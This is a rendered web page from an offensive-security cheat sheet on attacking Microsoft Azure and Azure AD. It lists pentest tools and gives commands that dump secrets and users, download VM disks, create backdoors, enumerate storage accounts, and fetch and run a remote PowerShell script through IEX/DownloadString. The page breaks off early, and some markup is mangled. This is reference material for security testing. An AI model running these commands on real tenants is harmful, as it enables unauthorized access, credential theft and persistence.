  <!-- Google Tag and Analytics -->
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BJ57VSC3B5"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-BJ57VSC3B5');
</script>
<!-- Translate website -->
<script>
/*
  function googleTranslateElementInit() {

  new google.translate.TranslateElement(
    {
      pageLanguage: "en",
      includedLanguages: "en,id",
      layout: google.translate.TranslateElement.InlineLayout.SIMPLE
    },
    "google_translate_element"
  );
}
setTimeout( function() {
  googleTranslateElementInit();
  }, 500);
*/
</script>
  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScripts -->
<!-- <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script> -->
  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  <script defer
    src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>

  <!--
  JS selector for site.
-->


  



  <!-- image lazy-loading & popup -->
  <script async
    src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script>





<script defer src="/assets/js/dist/post.min.js"></script>





</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">

  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
        <img src="/assets/img/logo.jpg" alt="avatar" onerror="this.style.display='none'">
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">PayloadsAllTheThings</a>
    </div>

    <div class="site-subtitle font-italic">A list of useful payloads</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">
    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i>
        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center">

    
      

      
      <a href="https://github.com/Zxce3" aria-label="github"
        class="order-3"
        target="_blank" rel="noopener">
        <i class="fab fa-github-alt"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/Zxce3_" aria-label="twitter"
        class="order-4"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['Zxce3','protonmail.com'].join('@')" aria-label="email"
        class="order-5"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        class="order-6"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

    
      
        <span class="icon-border order-2"></span>
      

      <span id="mode-toggle-wrapper" class="order-1">
        <!--
  Switch the mode between dark and light.
-->

<i class="mode-toggle fas fa-adjust"></i>

<script type="text/javascript">

  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      var self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addListener(function() {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.updateMermaid();
      });

    } /* constructor() */


    setDark() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_KEY);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer) ) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    updateMermaid() {
      if (typeof mermaid !== "undefined") {
        let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default");
        let config = { theme: expectedTheme };

        /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */
        $(".mermaid").each(function() {
          let svgCode = $(this).prev().children().html();
          $(this).removeAttr("data-processed");
          $(this).html(svgCode);
        });

        mermaid.initialize(config);
        mermaid.init(undefined, ".mermaid");
      }
    }

    flipMode() {
      if (this.hasMode) {
        if (this.isSysDarkPrefer) {
          if (this.isLightMode) {
            this.clearMode();
          } else {
            this.setLight();
          }

        } else {
          if (this.isDarkMode) {
            this.clearMode();
          } else {
            this.setDark();
          }
        }

      } else {
        if (this.isSysDarkPrefer) {
          this.setLight();
        } else {
          this.setDark();
        }
      }

      this.updateMermaid();

    } /* flipMode() */

  } /* ModeToggle */

  let toggle = new ModeToggle();

  $(".mode-toggle").click(function() {

    toggle.flipMode();

  });

</script>

      </span>
    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          

        

      

        
          <span>Azure</span>

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->


<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->


<!-- Add attribute 'hide-bullet' to the checkbox list -->





  <!-- add CDN prefix if it exists -->
  

  

  <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
  




<!-- return -->
<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>Azure</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <span class="semi-bold">
            Zxce3
          </span>
          <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Sat, May 16, 2020, 12:00 AM +0700"
  

  
  prep="on" >

  
  

  
    May 16, 2020
  

  <i class="unloaded">2020-05-16T00:00:00+07:00</i>

</span>

        </div>

        <div>
          <!-- lastmod -->
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->


<!-- words per minute  -->







<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2438 words">13 min reads</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        

        <h2 id="summary">Summary</h2>

<ul>
  <li><a href="#tools">Tools</a></li>
  <li><a href="#azure-architecture">Azure Architecture</a></li>
  <li><a href="#azure-storage-account----access">Azure Storage Account - Access</a></li>
  <li><a href="#azure-ad-vs-active-directory">Azure AD vs Active Directory</a></li>
  <li><a href="#azure-ad---enumeration">Azure AD - Enumeration</a></li>
  <li><a href="#azure-ad---password-spray">Azure AD - Password Spray</a></li>
  <li><a href="#azure-ad---convert-guid-to-sid">Azure AD - Convert GUID to SID</a></li>
  <li><a href="#azure-ad---sign-in-with-a-service-principal">Azure AD - Sign in with a service principal</a></li>
  <li><a href="#azure-ad-connect---password-extraction">Azure AD Connect - Password extraction</a></li>
  <li><a href="#azure-ad-connect---msol-accounts-password-and-dcsync">Azure AD Connect - MSOL Account’s password and DCSync</a></li>
  <li><a href="#azure-ad-connect---seamless-single-sign-on-silver-ticket">Azure AD Connect - Seamless Single Sign On Silver Ticket</a></li>
  <li><a href="#azure-ad---adfs-federation-server-cloud-kerberos">Azure AD - ADFS Federation Server ~Cloud Kerberos</a></li>
  <li><a href="#azure-ad---persistence-via-automation-accounts">Azure AD - Persistence via Automation accounts</a></li>
  <li><a href="#azure-vm---execute-command-as-nt-system-with-contributor-right">Azure VM - Execute command as NT SYSTEM with Contributor right</a></li>
  <li><a href="#office365---enumerating-users">Office365 - Enumerating Users</a></li>
  <li><a href="#references">References</a></li>
</ul>

<h2 id="tools">Tools</h2>

<p>:warning: 16 apr 2019 : BloodHound does not support any analysis with AzureAD.  <br />
:warning: Tokens for Azure are cached in <code class="language-plaintext highlighter-rouge">C:\Users\[Name]\.Azure\accessTokens.json</code></p>

<ul>
  <li><strong>PowerZure</strong> -
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">require</span><span class="w"> </span><span class="nx">az</span><span class="w"> </span><span class="nx">module</span><span class="w"> </span><span class="o">!</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/hausec/PowerZure</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">ipmo</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerZure</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">Set-Subscription</span><span class="w"> </span><span class="nt">-Id</span><span class="w"> </span><span class="p">[</span><span class="n">idgoeshere</span><span class="p">]</span><span class="w">

  </span><span class="c"># Reader</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">Get-Runbook</span><span class="p">,</span><span class="w"> </span><span class="nx">Get-AllUsers</span><span class="p">,</span><span class="w"> </span><span class="nx">Get-Apps</span><span class="p">,</span><span class="w"> </span><span class="nx">Get-Resources</span><span class="p">,</span><span class="w"> </span><span class="nx">Get-WebApps</span><span class="p">,</span><span class="w"> </span><span class="nx">Get-WebAppDetails</span><span class="w">

  </span><span class="c"># Contributor</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">Execute-Command</span><span class="w"> </span><span class="nt">-OS</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nt">-VM</span><span class="w"> </span><span class="nx">Win10Test</span><span class="w"> </span><span class="nt">-ResourceGroup</span><span class="w"> </span><span class="nx">Test-RG</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"whoami"</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">Execute-MSBuild</span><span class="w"> </span><span class="nt">-VM</span><span class="w"> </span><span class="nx">Win10Test</span><span class="w">  </span><span class="nt">-ResourceGroup</span><span class="w"> </span><span class="nx">Test-RG</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="s2">"build.xml"</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">Get-AllSecrets</span><span class="w"> </span><span class="c"># AllAppSecrets, AllKeyVaultContents</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">Get-AvailableVMDisks</span><span class="p">,</span><span class="w"> </span><span class="nx">Get-VMDisk</span><span class="w"> </span><span class="c"># Download a virtual machine's disk</span><span class="w">

  </span><span class="c"># Owner</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">Set-Role</span><span class="w"> </span><span class="nt">-Role</span><span class="w"> </span><span class="nx">Contributor</span><span class="w"> </span><span class="nt">-User</span><span class="w"> </span><span class="nx">test</span><span class="err">@</span><span class="nx">contoso.com</span><span class="w"> </span><span class="nt">-Resource</span><span class="w"> </span><span class="nx">Win10VMTest</span><span class="w">
    
  </span><span class="c"># Administrator</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">Create-Backdoor</span><span class="p">,</span><span class="w"> </span><span class="nx">Execute-Backdoor</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>Azure CLI</strong> - Default azure CLI
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="err">$</span><span class="w"> </span><span class="n">AZ_REPO</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="n">lsb_release</span><span class="w"> </span><span class="nt">-cs</span><span class="p">)</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s2">"deb [arch=amd64] https://packages.microsoft.com/repos/azure-cli/ </span><span class="nv">$AZ_REPO</span><span class="s2"> main"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="nx">tee</span><span class="w"> </span><span class="nx">/etc/apt/sources.list.d/azure-cli.list</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">curl</span><span class="w"> </span><span class="nt">-L</span><span class="w"> </span><span class="nx">https://packages.microsoft.com/keys/microsoft.asc</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="nx">apt-key</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="o">-</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="nx">apt-get</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nx">apt-transport-https</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="nx">apt-get</span><span class="w"> </span><span class="nx">update</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">sudo</span><span class="w"> </span><span class="nx">apt-get</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nx">azure-cli</span><span class="w">
  </span><span class="c"># dump users</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">az</span><span class="w"> </span><span class="nx">ad</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nt">--output</span><span class="o">=</span><span class="n">table</span><span class="w"> </span><span class="nt">--query</span><span class="o">=</span><span class="s1">'[].{Created:createdDateTime,UPN:userPrincipalName,Name:displayName,Title:jobTitle,Department:department,Email:mail,UserId:mailNickname,Phone:telephoneNumber,Mobile:mobile,Enabled:accountEnabled}'</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>MicroBurst</strong> - MicroBurst includes functions and scripts that support Azure Services discovery, weak configuration auditing, and post exploitation actions such as credential dumping
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="err">$</span><span class="w"> </span><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/NetSPI/MicroBurst</span><span class="w">
  </span><span class="n">PS</span><span class="w"> </span><span class="nx">C:</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\MicroBurst.psm1</span><span class="w">
  </span><span class="n">PS</span><span class="w"> </span><span class="nx">C:</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\Get-AzureDomainInfo.ps1</span><span class="w">
  </span><span class="n">PS</span><span class="w"> </span><span class="nx">C:</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-AzureDomainInfo</span><span class="w"> </span><span class="nt">-folder</span><span class="w"> </span><span class="nx">MicroBurst</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>SkyArk</strong> - Discover the most privileged users in the scanned Azure environment - including the Azure Shadow Admins. <br />
  Require:
    <ul>
      <li>Read-Only permissions over Azure Directory (Tenant)</li>
      <li>Read-Only permissions over Subscription</li>
      <li>Require AZ and AzureAD module or administrator right</li>
    </ul>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="err">$</span><span class="w"> </span><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/cyberark/SkyArk</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">powershell</span><span class="w"> </span><span class="nt">-ExecutionPolicy</span><span class="w"> </span><span class="nx">Bypass</span><span class="w"> </span><span class="nt">-NoProfile</span><span class="w">
  </span><span class="n">PS</span><span class="w"> </span><span class="nx">C</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\SkyArk.ps1</span><span class="w"> </span><span class="nt">-force</span><span class="w">
  </span><span class="n">PS</span><span class="w"> </span><span class="nx">C</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Start-AzureStealth</span><span class="w">

  </span><span class="n">or</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">Cloud</span><span class="w"> </span><span class="nx">Console</span><span class="w">

  </span><span class="n">PS</span><span class="w"> </span><span class="nx">C</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">IEX</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'https://raw.githubusercontent.com/cyberark/SkyArk/master/AzureStealth/AzureStealth.ps1'</span><span class="p">)</span><span class="w">  
  </span><span class="n">PS</span><span class="w"> </span><span class="nx">C</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Scan-AzureAdmins</span><span class="w">  
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p><strong>Azurite Explorer</strong> and <strong>Azurite Visualizer</strong> : Enumeration and reconnaissance activities in the Microsoft Azure Cloud.</p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/mwrlabs/Azurite.git</span><span class="w">
  </span><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/FSecureLABS/Azurite</span><span class="w">
  </span><span class="n">git</span><span class="w"> </span><span class="nx">submodule</span><span class="w"> </span><span class="nx">init</span><span class="w">
  </span><span class="n">git</span><span class="w"> </span><span class="nx">submodule</span><span class="w"> </span><span class="nx">update</span><span class="w">
  </span><span class="n">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="nx">AzureRM</span><span class="w">
  </span><span class="n">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="nx">AzuriteExplorer.ps1</span><span class="w">
  </span><span class="n">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Review-AzureRmSubscription</span><span class="w">
  </span><span class="n">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Review-CustomAzureRmSubscription</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p><strong>Azucar</strong> : Azucar automatically gathers a variety of configuration data and analyses all data relating to a particular subscription in order to determine security risks.</p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="c"># You should use an account with at least read-permission on the assets you want to access</span><span class="w">
</span><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/nccgroup/azucar.git</span><span class="w">
</span><span class="n">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ChildItem</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nx">c:\Azucar_V10</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Unblock-File</span><span class="w">

</span><span class="n">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\Azucar.ps1</span><span class="w"> </span><span class="nt">-AuthMode</span><span class="w"> </span><span class="nx">UseCachedCredentials</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w"> </span><span class="nt">-WriteLog</span><span class="w"> </span><span class="nt">-Debug</span><span class="w"> </span><span class="nt">-ExportTo</span><span class="w"> </span><span class="nx">PRINT</span><span class="w">
</span><span class="n">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\Azucar.ps1</span><span class="w"> </span><span class="nt">-ExportTo</span><span class="w"> </span><span class="nx">CSV</span><span class="p">,</span><span class="nx">JSON</span><span class="p">,</span><span class="nx">XML</span><span class="p">,</span><span class="nx">EXCEL</span><span class="w"> </span><span class="nt">-AuthMode</span><span class="w"> </span><span class="nx">Certificate_Credentials</span><span class="w"> </span><span class="nt">-Certificate</span><span class="w"> </span><span class="nx">C:\AzucarTest\server.pfx</span><span class="w"> </span><span class="nt">-ApplicationId</span><span class="w"> </span><span class="nx">00000000-0000-0000-0000-000000000000</span><span class="w"> </span><span class="nt">-TenantID</span><span class="w"> </span><span class="nx">00000000-0000-0000-0000-000000000000</span><span class="w">
</span><span class="n">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\Azucar.ps1</span><span class="w"> </span><span class="nt">-ExportTo</span><span class="w"> </span><span class="nx">CSV</span><span class="p">,</span><span class="nx">JSON</span><span class="p">,</span><span class="nx">XML</span><span class="p">,</span><span class="nx">EXCEL</span><span class="w"> </span><span class="nt">-AuthMode</span><span class="w"> </span><span class="nx">Certificate_Credentials</span><span class="w"> </span><span class="nt">-Certificate</span><span class="w"> </span><span class="nx">C:\AzucarTest\server.pfx</span><span class="w"> </span><span class="nt">-CertFilePassword</span><span class="w"> </span><span class="nx">MySuperP</span><span class="err">@</span><span class="nx">ssw0rd</span><span class="o">!</span><span class="w"> </span><span class="nt">-ApplicationId</span><span class="w"> </span><span class="nx">00000000-0000-0000-0000-000000000000</span><span class="w"> </span><span class="nt">-TenantID</span><span class="w"> </span><span class="nx">00000000-0000-0000-0000-000000000000</span><span class="w">

</span><span class="c"># resolve the TenantID for an specific username</span><span class="w">
</span><span class="n">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\Azucar.ps1</span><span class="w"> </span><span class="nt">-ResolveTenantUserName</span><span class="w"> </span><span class="nx">user</span><span class="err">@</span><span class="nx">company.com</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<h2 id="azure-architecture">Azure Architecture</h2>

<p><img data-proofer-ignore data-src="https://miro.medium.com/max/880/0*-5NqtHX2C8arkwQG" alt="Azure Architecture" /></p>

<ul>
  <li>Azure AD Joined : https://pbs.twimg.com/media/EQZv62NWAAEQ8wE?format=jpg&amp;name=large</li>
  <li>Workplace Joined : https://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg&amp;name=large</li>
  <li>Hybrid Joined : https://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg&amp;name=large</li>
  <li>Workplace joined on AADJ or Hybrid : https://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg&amp;name=large</li>
</ul>

<h2 id="azure-storage-account----access">Azure Storage Account -  Access</h2>

<ul>
  <li>Blobs – *.blob.core.windows.net
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="err">$</span><span class="w"> </span><span class="n">AzCopy</span><span class="w"> </span><span class="nx">/Source:https://myaccount.blob.core.windows.net/mycontainer</span><span class="w"> </span><span class="nx">/Dest:C:\myfolder</span><span class="w"> </span><span class="nx">/SourceKey:key</span><span class="w"> </span><span class="nx">/S</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>File Services – *.file.core.windows.net</li>
  <li>Data Tables – *.table.core.windows.net</li>
  <li>Queues – *.queue.core.windows.net
z
```powershell
    <h1 id="httpsgithubcomnetspimicroburst">https://github.com/NetSPI/MicroBurst</h1>
    <p>S C:&gt; Invoke-EnumerateAzureBlobs -Base secure [-BingAPIKey 12345678901234567899876543210123]
Found Storage Account -  secure.blob.core.windows.net
Found Storage Account -  testsecure.blob.core.windows.net
Found Storage Account -  securetest.blob.core.windows.net
Found Storage Account -  securedata.blob.core.windows.net
Found Storage Account -  securefiles.blob.core.windows.net
Found Storage Account -  securefilestorage.blob.core.windows.net
Found Storage Account -  securestorageaccount.blob.core.windows.net
Found Storage Account -  securesql.blob.core.windows.net
Found Storage Account -  hrsecure.blob.core.windows.net
Found Storage Account -  secureit.blob.core.windows.net
Found Storage Account -  secureimages.blob.core.windows.net
Found Storage Account -  securestorage.blob.core.windows.net</p>
  </li>
</ul>

<p>Bing Found Storage Account - notrealstorage.blob.core.windows.net</p>

<p>Found Container - hrsecure.blob.core.windows.net/NETSPItest</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre></td><td class="rouge-code"><pre>

## Azure AD vs Active Directory

| Active Directory  | Azure AD  |
|---|---|
| LDAP  | REST API'S  |
| NTLM/Kerberos  | OAuth/SAML/OpenID |
| Structured directory (OU tree)  | Flat structure  |
| GPO  | No GPO's  |
| Super fine-tuned access controls  | Predefined roles |
| Domain/forest  | Tenant  |
| Trusts  | Guests  |


* Password Hash Syncronization (PHS)
    * Passwords from on-premise AD are sent to the cloud
    * Use replication via a service account created by AD Connect
* Pass Through Authentication (PTA)
    * Possible to perform DLL injection into the PTA agent and intercept authentication requests: credentials in clear-text
* Connect Windows Server AD to Azure AD using Federation Server (ADFS)
    * Dir-Sync : Handled by on-premise Windows Server AD, sync username/password

## Azure AD - Enumeration

&gt; By default it is possible to query almost all the information about the directory as authenticated user, even when the Azure portal is restricted, using Azure AD Graph.

Check if the compagny is using Azure AD with `https://login.microsoftonline.com/getuserrealm.srf?login=username@target.onmicrosoft.com&amp;xml=1`.

```powershell
$ git clone https://github.com/dirkjanm/ROADtools
